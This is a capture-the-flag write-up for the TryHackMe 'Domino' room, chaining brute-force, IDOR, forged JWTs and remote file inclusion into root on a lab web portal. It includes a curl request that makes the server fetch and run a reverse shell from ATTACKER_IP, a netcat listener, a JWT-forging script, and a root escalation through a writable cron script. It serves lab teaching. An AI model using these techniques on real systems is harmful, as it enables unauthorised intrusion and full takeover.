# Domino

**Difficulty:** 🟡 Medium · **Room:** [TryHackMe ↗](https://tryhackme.com/room/domino)

The NexusCorp Employee Portal appears to be a typical internal application with authentication controls and role-based access in place. However, multiple small weaknesses, ranging from misconfigurations to logic flaws, can be combined to fully compromise the system.

As an attacker, your objective is to observe how the application behaves, interact with its endpoints, and identify weak trust boundaries. By analysing requests, modifying parameters, and chaining vulnerabilities together, you can progressively escalate your access and move deeper into the system.

*A single misstep can trigger a chain reaction — exploit each weakness in sequence and watch the system fall, one domino at a time.*

---

## Reconnaissance

I started, as always, with an `nmap` scan to look for open ports:

```bash
nmap TARGET_IP -p-
```

The scan revealed `http` running on port `80` and `ssh` on `22`. I followed up with another scan, this time with version detection and default scripts enabled:

```bash
nmap TARGET_IP -p 22,80 -sV -sC
```

These were the results:

![](images/nmap_scan.png)

So `ssh` was running `OpenSSH 9.6p1`, and the `http` server was running `Apache/2.4.58`. I visited the page on port `80` and found a login page for the NexusCorp employee portal. Next, I used `feroxbuster` to enumerate existing directories and files, which turned up a lot of useful information:

![](images/ferox_scan.png)

I visited `/backup/README.txt` first:

```text
NexusCorp Backup Configuration
================================
config.enc  - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```

I downloaded the application configuration file from `/backup/config.enc`, then checked `/static/app.js`:

![](images/encryption_key.png)

This file contained the key used to encrypt `config.enc`. The encryption method was `AES-ECB-128`, which is symmetric, meaning the same key is used both to encrypt and decrypt the data. I used an [AES decryption tool](https://emn178.github.io/online-tools/aes/decrypt/) to decrypt the file. Since the key had to be 16 bytes and the one found in `app.js` was only 14, I padded it with `0000` (2 null bytes) at the end of the hex version of the key. I selected `ECB` mode and decrypted the file, though the result didn't reveal anything particularly sensitive:

```text
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```

I then looked more closely at the main page. The username placeholder revealed its expected format:

```text
firstname.lastname
```

From there, I navigated to `/team.php`, found earlier with `feroxbuster`. This endpoint listed the people working at NexusCorp, along with their emails and job titles, which let me build a list of usernames:

```text
laura.hayes laura.hayes@nexus.corp CIO
michael.chen michael.chen@nexus.corp Lead Security Engineer
sarah.johnson sarah.johnson@nexus.corp Senior Software Engineer
robert.wilson robert.wilson@nexus.corp DevOps Engineer
emma.taylor emma.taylor@nexus.corp Product Manager
david.brown david.brown@nexus.corp Full Stack Developer
james.wright james.wright@nexus.corp Systems Administrator
```

Next, I checked `/forgot.php`, a page for resetting a user's password by sending them an email. Providing an invalid username produced a message saying the account wasn't found. Using that behavior, I confirmed that all of the usernames I'd gathered were valid.

---

## Credential Access: Password Brute-Force

I used `hydra` to brute-force passwords for the valid usernames, which turned up 3 valid credentials:

![](images/hydra_login_page.png)

`sarah.johnson`, `robert.wilson`, and `emma.taylor` all turned out to be using the same weak password.

---

## Initial Access: Logging in as sarah.johnson

I logged in as `sarah.johnson` first and accessed the employee portal:

![](images/dashboard.png)

The page had a `Quick Links` section. I opened the `My Profile API` link, which redirected me to `/api/users/profile.php?id=`.

---

## Privilege Escalation: IDOR in the Profile API

I tried modifying the `id` parameter to check whether the endpoint was vulnerable to IDOR, and it was. Setting `id=1` let me access information about `laura.hayes`, along with the first flag:

![](images/first_flag.png)

`laura.hayes` turned out to be an admin account. I went back to `/dashboard.php` and read the `File Viewer` section. It explained that the `/api/files.php?name=` endpoint existed, and that modifying the `name` parameter would let me access internal documents. To use this feature, I first had to obtain a JWT token via the `/api/auth/token.php` endpoint.

---

## Privilege Escalation: Forging an Admin JWT

I obtained a token and sent a test request:

```bash
curl 'http://MACHINE_IP/api/files.php?name=' -H 'Authorization: Bearer <TOKEN>'
```

The response stated that I needed an admin token:

```text
{"error":"Admin JWT required. Check your token payload."}
```

This is the decoded payload:

```json
{
  "sub": "sarah.johnson",
  "role": "user",
  "iat": 1790153363,
  "exp": 1790156963
}
```

I tried cracking the JWT secret with `hashcat`, but that didn't work. Instead, I decided to craft my own JWT token with the `role` changed to `admin`, signing it with the AES key I'd found earlier. I wrote a small Python script to do this:

```python
import jwt

secret = "KEY_VALUE"

payload = {
  "sub": "sarah.johnson",
  "role": "admin",
  "iat": 1790153363,
  "exp": 1790156963
}

token = jwt.encode(
    payload,
    secret,
    algorithm="HS256"
)

print(token)
```

I ran the script and sent a new request using the forged token. This time, it worked:

```text
{"error":"Missing name parameter","usage":"\/api\/files.php?name=\/var\/www\/html\/filename.txt"}
```

The response confirmed I could only access files located under `/var/www/html`. The most interesting file in that directory was likely `config.php`, so I requested it next and got its contents:

```php
<?php
define('DB_HOST', 'localhost');
define('DB_NAME', 'nexusdb');
define('DB_USER', 'app_user');
define('DB_PASS', 'REDACTED');
define('JWT_SECRET', 'REDACTED');
define('APP_SECRET', 'REDACTED');

function get_db() {
    $pdo = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASS);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    return $pdo;
}
?>
```

The file contained database credentials, along with `JWT_SECRET` (used for JWT tokens) and `APP_SECRET` (used for session cookies). The real `JWT_SECRET` was actually different from the key I'd used to forge my token — which meant the application wasn't validating the token's signature at all, just trusting whatever role was in the payload.

I also read the contents of `/api/files.php`, and part of its code revealed something critical:

```php
if (strpos($name, 'http://') === 0 || strpos($name, 'https://') === 0) {
    $remote = @file_get_contents($name);
    if ($remote === false) {
        http_response_code(502);
        echo json_encode(['error' => 'Could not fetch remote file']);
        exit;
    }
...
eval(str_replace('<?php', '', $remote));
```

If the `name` parameter contains a URL, the application fetches its contents with `file_get_contents()` and stores them in the `$remote` variable. That content is then passed to `eval()`, which executes it as PHP code.

So if `name` points to a file containing PHP code, the server will download and run that code — a Remote File Inclusion (RFI) vulnerability I could use to get a reverse shell.

---

## Remote Code Execution: RFI in files.php

I created a `.php` reverse shell using [revshells.com](https://www.revshells.com/), then started an HTTP server to host it:

```bash
python3 -m http.server 8888
```

And sent the malicious request:

```bash
curl 'http://MACHINE_IP/api/files.php?name=http://ATTACKER_IP:8888/shell.php' -H 'Authorization: Bearer <TOKEN>'
```

With a listener running:

```bash
rlwrap nc -lvnp 4444
```

This gave me a reverse shell as `www-data`, along with another flag:

![](images/www_data_rev_shell.png)

The flag that's normally only reachable after logging into the portal as an admin was, once I had shell access, readable directly at `/var/www/html/admin/index.php`:

![](images/second_flag.png)

---

## Privilege Escalation: `devops` via Password Reuse

I tried to find files owned by `devops` that I could write to, but found none. I then remembered I had `devops`' credentials for the MySQL database, so I checked whether that same password also worked for SSH login. It did — I logged in via SSH as `devops` and obtained another flag:

![](images/ssh_devops.png)

So exploiting the RFI vulnerability turned out not to be necessary to reach this account.

---

## Privilege Escalation: `root`

Running `pspy64` turned up two interesting processes, `admin_bot.py` and `health_check.sh`:

![](images/health_proces.png)
![](images/admin_proces.png)

Both ran as `root`, and I had write access to both. I appended a reverse shell payload to `health_check.sh`, and once it ran again, I got a shell as root:

![](images/root.png)

---

## Kill Chain

This box was a genuine chain of small issues, each one enabling the next. Directory enumeration led to a backup file and its decryption key sitting right next to it, but the config it decrypted to didn't reveal much on its own — the real value of that key only became clear much later. A staff directory endpoint and a username-enumeration bug on the password reset page gave me a full list of valid employee accounts, and a shared weak password across three of them was enough to get a first foothold.

From there, an IDOR in the profile API leaked another user's data with nothing more than an incrementing ID, and a File Viewer feature turned into full arbitrary file read once I realized the app never actually validated JWT signatures — the AES key found earlier during reconnaissance worked perfectly as a forged signing key. Reading source code through that file-read primitive then exposed a Remote File Inclusion bug in the same endpoint, which was enough for full code execution.

Privilege escalation past that point came down to simple password reuse (`devops`' database password worked over SSH) and a root-owned, world-writable script picked up by a scheduled job.

`Anonymous visitor → sarah.johnson (password brute-force) → laura.hayes' data (IDOR) → forged admin JWT → www-data (RFI) → devops (password reuse) → root (writable cron script)`

- **Reconnaissance:** Directory brute-force → backup file and decryption key → AES-ECB decryption (limited value)
- **Initial Access:** Username enumeration (staff directory + password-reset endpoint) → password brute-force → login as `sarah.johnson`
- **Information Disclosure:** IDOR in `/api/users/profile.php?id=` → access to `laura.hayes`' (admin) data
- **Privilege Escalation:** Unvalidated JWT signature → forged admin token using the earlier AES key → arbitrary file read → `config.php` disclosure
- **Remote Code Execution:** RFI in `/api/files.php?name=` → reverse shell as `www-data`
- **Privilege Escalation:** Reused `devops` database password over SSH → shell as `devops`
- **Final Escalation:** Writable, root-owned `health_check.sh` picked up by a scheduled job → shell as root

> Thanks for reading!